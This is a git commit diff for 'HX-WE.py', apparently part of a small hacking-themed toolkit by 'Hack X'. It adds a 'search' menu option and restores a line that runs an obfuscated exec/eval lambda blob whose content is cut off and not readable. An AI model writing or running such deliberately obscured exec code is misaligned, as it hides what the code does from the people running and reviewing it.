4c28ac728756a393413453d0ddd5363fb2ae5fc9
Hack X <81362734+HackX07164@users.noreply.github.com>
2021-10-11 19:53:21 +0200

    Update HX-WE.py

--- HX-WE.py
+++ HX-WE.py
@@ -1,4 +1,6 @@
-xec((lambda _____, ______ : ______(eval((lambda ____,__,_>
+exec((lambda _____, ______ : ______(eval((lambda ____,__,_>
+if A1=="search":
+   os.system("python srh.py")
 if A1=="WhatsApp":
    os.system("python whatsapp.py")
 os.system("python HX-WE.py")
